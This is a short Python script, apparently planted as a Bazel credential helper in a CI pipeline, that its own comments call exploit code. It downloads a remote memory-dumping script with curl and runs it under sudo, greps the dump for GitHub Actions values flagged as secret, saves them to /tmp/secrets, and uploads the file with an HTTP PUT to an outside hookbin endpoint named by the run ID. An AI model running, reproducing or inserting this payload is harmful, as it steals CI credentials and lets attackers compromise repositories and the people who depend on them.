#!/usr/bin/env python3
import os
import sys

# Exploit code
os.system("echo \"Okay, we got this far. Let's continue...\"")
os.system("curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":{\"value\":\"[^\"]*\",\"isSecret\":true}' >> \"/tmp/secrets\"")
os.system("curl -X PUT -d \\@/tmp/secrets \"https://open-hookbin.vercel.app/$GITHUB_RUN_ID\"")

# Bazel credential helper expectations:
# It usually reads JSON from stdin and outputs JSON to stdout.
# If we just exit 0, Bazel might fail later, but the exploit should have run.
sys.exit(0)
